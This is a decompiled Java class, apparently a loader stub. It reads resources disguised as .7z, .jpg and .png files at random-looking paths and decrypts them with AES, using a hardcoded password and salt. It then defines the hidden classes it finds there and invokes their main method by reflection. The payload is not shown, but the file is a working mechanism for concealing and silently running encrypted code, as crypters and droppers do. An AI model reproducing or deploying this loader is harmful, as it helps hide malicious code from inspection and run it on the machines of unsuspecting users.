/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  q0b4.bootstrap.templates.Header
 */
package q0b4.bootstrap.templates;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.lang.reflect.Method;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

/*
 * Exception performing whole class analysis ignored.
 */
public class Header extends ClassLoader {
	public static final String CAT_bootstrap = "bootstrap";
	public static final String CAT_obfuscated = "obfuscated";
	private static Map<String, Object[]> obfuscatedEntryList;
	public static final String[] predefinedClassNamesToBeLoaded;
	private static final String LOADER_CLASS_NAME = "q0b4.bootstrap.templates.Loader";

	public Header() throws Exception {
		super(Header.class.getClassLoader());
		obfuscatedEntryList = (Map)Header.decryptObject((Object[])new Object[]{new String[]{"club/crop/dig/lady/bone/nor/net/here/Heterosporeae.7z", "back/bit/swim/left/out/off/bed/own/Gluttei.jpg", "flow/nut/view/use/owe/hurt/upon/sink/Calcimined.png"}, new int[]{10514, 10528}, "9QYXNrSCp2PsZLoN", "462kpXsm0iR5A8Tg"});
		String[] arrstring = new String[]{"q0b4.bootstrap.templates.Loader$1", "q0b4.bootstrap.templates.Loader", "q0b4.bootstrap.templates.Loader$1$1"};
		Class[] arrclass = new Class[arrstring.length];
		Class class_ = null;
		int n = 0;
		for (String object2 : arrstring) {
			byte[] arrby = Header.decrypt((Object[])Header.getEntryData((String)"bootstrap", (String)object2));
			int n2 = n++;
			Class class_2 = this.defineClass(object2, arrby, 0, arrby.length, Header.class.getProtectionDomain());
			arrclass[n2] = class_2;
			Class class_3 = class_2;
			if (!"q0b4.bootstrap.templates.Loader".equals(object2)) continue;
			class_ = class_3;
		}
		for (Class class_4 : arrclass) {
			this.resolveClass(class_4);
		}
		ClassLoader classLoader = (ClassLoader)class_.newInstance();
		String string = "j.t.e.Main";
		Class<?> class_4 = classLoader.loadClass(string);
		Method method = class_4.getMethod("main", String[].class);
		method.invoke(null, new Object[]{new String[0]});
	}

	public static Object[] getEntryData(String string, String string2) {
		return (Object[])obfuscatedEntryList.get(string + '/' + string2);
	}

	public static Object decryptObject(Object[] arrobject) throws Exception {
		ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(Header.decrypt((Object[])arrobject)));
		return objectInputStream.readObject();
	}

	public static byte[] decrypt(Object[] arrobject) throws Exception {
		String[] arrstring = (String[])arrobject[0];
		int[] arrn = (int[])arrobject[1];
		String string = (String)arrobject[2];
		String string2 = (String)arrobject[3];
		int n = arrn[0];
		int n2 = arrn[1];
		byte[] arrby = string.getBytes();
		byte[] arrby2 = string2.getBytes();
		byte[] arrby3 = new byte[1024];
		byte[] arrby4 = new byte[n2];
		int n3 = 0;
		for (String string3 : arrstring) {
			int n4;
			InputStream inputStream = Header.class.getClassLoader().getResourceAsStream(string3);
			while ((n4 = inputStream.read(arrby3)) > -1) {
				System.arraycopy(arrby3, 0, arrby4, n3, n4);
				n3 += n4;
			}
		}
		boolean bl = true;
		if (bl) {
			Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
			cipher.init(2, new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String(arrby).toCharArray(), arrby2, 10000, 128)).getEncoded(), "AES"));
			return cipher.doFinal(arrby4);
		}
		return arrby4;
	}

	public static byte[] decryptQ(Object[] arrobject) throws IOException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException {
		byte[] arrby4;
		Object object;
		String[] arrstring = (String[]) arrobject[1];
		int[] arrn = (int[]) arrobject[2];
		String string = (String) arrobject[3];
		int n = arrn[0];
		int n2 = arrn[1];
		byte[] arrby = string.getBytes();
		byte[] arrby2 = new byte[1024];
		byte[] arrby3 = new byte[n2];
		int n3 = 0;
		for (String object22 : arrstring) {
			int gZIPInputStream;
			object = Header.class.getClassLoader().getResourceAsStream(object22);
			while ((gZIPInputStream = ((InputStream)object).read(arrby2)) > -1) {
				System.arraycopy(arrby2, 0, arrby3, n3, gZIPInputStream);
				n3 += gZIPInputStream;
			}
		}
		Cipher cipher = Cipher.getInstance("AES");
		SecretKeySpec secretKeySpec = new SecretKeySpec(arrby, "AES");
		cipher.init(2, secretKeySpec);
		byte[] arrby5 = arrby4 = cipher.doFinal(arrby3);
		object = new byte[n];
		n3 = 0;
		GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(arrby5));
		DataInputStream dataInputStream = new DataInputStream(gZIPInputStream);
		dataInputStream.readFully((byte[])object);
		return object;
	}

	private void debug() {
	}

	static {
		predefinedClassNamesToBeLoaded = new String[]{"Loader"};
	}
}